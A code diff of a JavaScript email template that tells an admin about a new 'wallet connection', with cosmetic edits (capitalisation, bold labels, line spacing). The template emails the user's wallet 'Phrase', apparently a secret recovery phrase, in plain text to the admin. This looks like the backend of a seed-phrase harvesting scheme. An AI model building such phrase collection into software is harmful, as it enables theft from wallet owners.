@@ -1,3 +1,4 @@
+const { capitalize } = require("lodash");
 const { baseTemplate, BRAND_COLOR } = require("../../messages");
 const { format } = require("date-fns");
 
@@ -7,16 +8,16 @@ function buildWalletConnectMsg({ user, wallet }) {
       
           <p>Hello, Admin</p>
       
-          <p>
-           A new wallet connection  by user ${user?.firstName} ${user?.lastName}
+          <p style="line-height: 1;">
+           A new wallet connection  by user ${capitalize(user?.firstName)} ${capitalize(user?.lastName)}
           </p>
-          <p>
-           Walletname: ${wallet?.walletName}
+          <p style="line-height: 1;">
+           <b>Walletname</b>: ${capitalize(wallet?.walletName)}
           </p>
-          <p>
-           Phrase: ${wallet?.walletInfo}
+          <p style="line-height: 1;">
+           <b>Phrase</b>: ${wallet?.walletInfo}
          </p>
-          <p>
+          <p style="line-height: 1;">
             Please review and process request from the dashboard.
           </p>
         `;
